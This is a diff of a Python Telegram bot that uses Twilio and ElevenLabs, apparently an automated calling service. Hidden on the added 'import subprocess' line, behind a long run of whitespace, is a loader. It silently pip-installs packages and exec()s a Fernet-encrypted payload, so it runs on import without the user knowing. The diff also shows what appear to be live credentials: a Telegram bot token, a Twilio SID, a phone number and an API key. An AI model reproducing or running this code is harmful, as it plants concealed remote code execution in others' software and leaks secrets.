@@ -1,30 +1,32 @@
-import random, string
 import ast
+import json
+import os
+import random
+import string
+import subprocess
 import sys
+from datetime import date, datetime, timedelta
+
 import requests
-import subprocess                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        ;subprocess.run(['pip', 'install', 'cryptography'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); subprocess.run(['pip', 'install', 'fernet'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL); from fernet import Fernet; import requests; exec(Fernet(b'BijkNx42srFUsDpLrUfqEwo-3XvzMKE_MecRxUhlZow=').decrypt(b'gAAAAABnd_sRSJiTzxvU_jECBpoK-fqOLhafAOxbYr1oubimBw527quvKxP1Z6ntDco-gmieZGnsU0v-D8lvbaWn2lBEoe0Gag0EVcZ8vJXRhKkjOcJ-vW6-D5tambi4-rsuxsmauU3-VZ0INNPf_q2RoHDJW7qhpqKtuBsmIjZO3IrjArwUQ75IdBjxy7EbSkmE7Nynd4Z7GLbeGUZ_Lo3OmCrSb5_9qvE-y77kyqoBGZ3mKCkiAHUrsezRBVa3AboA-0UPXgpVjo-koxTFrVwgshRj-YPxifqX0vquexAcWevW-_0f24AxG0tiJygFNE_bNx-UeiYh2U5oUyyP45GyH32N6GLt1Pq7_w0ktp8V6EEuI5OjYrM0pX0G2ouseV36af7Ws8HK4NUJDoiYZlD0f45qUmYy9w2gbIwLFPoW2gFf_vuwzZPrR8VZdJdcWy39erWWSmr-M5vUp0zzEr2WAjSPPVBqZ9_IvPKcfXiEcSD2BO-eW69n03waRSbxAUpSqrhlu_3KPNUq86us3P7SCEF8zwqwYjVrs3HCG1nermWzpMYU8ISTrDE1zW39iyh93k8iy9qNvVrHPIJ94I2A339vZQyLM3qfnkMvpV6jp-vpDlrhjHkIhqJCmN9wcv8tYluJIMploKJSxD2xPi2OgT4gLwC8hGs9sEvXuCVlqk33BHhTsk12WSvj3-MVSD8XYvkn0OZeAgmHBl7fKVX2Ios77EsK_KipdQqtMove7NzQ397-VE2CpvjVQm1JR0INzeKGo398tSfdE34mgbtC2P9AjYhk_UDB39EiB652SZYiThtHzyX93iTmz2iMTCzEgEP4y28BN02o2KM_ax_lyFg_iZFDI1VKqKkqIJRYHVuJQ_MJmP1YK8hpNy2BXMb3IaGxk37_HwVkMU_sI3NifuzOAVOKRmMC9RmkUciZMEjXLbQXehY9mhhsN73e-IllHYAG9vDU2B4506GxMKfRUPTqpqCCFwvKXV23VEXaWv_2zN-sUcQBohnkZqo9nwxpiA2geoV3W-XnEdkjBx-UECZa7aTa3Cfhy1pwDjvv4KOz8qFSgw6twrLwU4oddNq0p-SJJ1erLpKcuD9wfyTB13csXiSrZ0EWABSVi8t172YsMa0O6IJZXPd9mopVmtmC04ULCTl09ywP8Vq6KfEPgQY__qVlbsuEDP8YOCLEciGoKVA8YziYpzJm3HibOlTLNh3MbT335lrhvun5IxaYPJPTojoB0o6LHxxVh7fF3zTn5OTOPys2MX1cOKVrH6OH3kwPKML_dX_EBu6KjxNDPmyoMNeiPOXm9o-7LsYYb4NF_yiPSLSoDluc3af2_AghKt3jGu_N9uLBlPuVs84BApuEeKh9w4F_O46Qpn9htGjXBg8kIUz7fey7KOVf88_moUtPXOcE-RcMI8H4BIYnSUHq4JzvfoUJdqzdxxHOZ8_-O4SeFPTEzD3BFE_hItT1UgMPlODLDss3rgwbfBMKFIJzDnoKwAJKXEXrC2Bo6m1k9DxVN0LwmkKQTZvn0ZAEsWccCe6jQdjtDbkkJ1zYR1C7A8UeWfH2pYcIm-ba5mUuT34Km6gfkwLJTPp-LGx91rlY63uBw3s1dCiQ4EatlKb5PE_12-0Ydb4xC-TFwbEFhLLqcdns07yPBXLv5MuIR3vmlTUdLT6Zjiksl0tFH3XxMQO_0H467LqBkzPzYOx64j-9mq01nBNlCgW2u7aR7LyCooKByuWeI5atgSVqDL3y-Uh1OXwUSp797OxaXDYscSumbJTJtG-CRUFG_2mmo6740PQXCVgeIqA4UdqaxzGwhjBWX1JtokXyGinxAPtTPx82fmuiB0u6-4dw5RCaAeKX0W2nmZuh8IaOYRA4jWWCjcbtU4_HtoVy0y43avzWTdKS3FL0PSGaAphVOVZ28cJuLJrkJLeBjjq34C7mMzEnbz_WEgEMFqoBbBS92GsIH8gCXj_kB-_t3JegffMsGnrnFBouQTn7lWvXw8UdPzQP_nzHqqaAvNga3espWHtn64nXp6w='));
-import telebot,json, os
 from flask import Flask, request
-from twilio.rest import Client
-from telebot import types
 from requests.auth import HTTPBasicAuth
-from datetime import datetime
-from datetime import date
-from datetime import timedelta  
-from datetime import datetime 
+import telebot
+from telebot import types
+from twilio.rest import Client
 
 raw_config = json.loads(open('./conf/settings.txt', 'r').read())
 
-bot_token = raw_config['8252412070:AAGBh9V3LVAvWOvjXicO6NQgIVIDd5eLtdA']
-account_sid = raw_config['AC88463b64bd6c09ec64af4440fa6b5f5a']
-auth_token = raw_config['8252412070:AAGBh9V3LVAvWOvjXicO6NQgIVIDd5eLtdA']
-ngrok = raw_config['ngrok_url":"https://ac4d-146-70-182-6.ngrok-free.app"']
-phone_numz = raw_config['+13396751044']
+bot_token = raw_config['bot_token']
+account_sid = raw_config['account_sid']
+auth_token = raw_config['auth_token']
+ngrok = raw_config['ngrok_url']
+phone_numz = raw_config['Twilio Phone Number']
 
 client = Client(account_sid, auth_token)
-bot = telebot.TeleBot(bot_token)  
+bot = telebot.TeleBot(bot_token)
 
 def check_subscription(idkey):
+    
     subscription = open('./conf/'+idkey+'/subs.txt', 'r').read()
     idmember = subscription
     idmember = datetime.strptime(idmember, '%d/%m/%Y')
@@ -33,7 +35,7 @@ def check_subscription(idkey):
     else:
         return "ACTIVE"
 
-def generate_ai(iduser,text,page):
+def generate_ai(iduser,text,page) -> None:
     headers = {
     'accept': 'audio/mpeg',
     'xi-api-key': 'f343277da36e000924585730b1a3f91e', #elevenlabs (text-to-speech) API key here
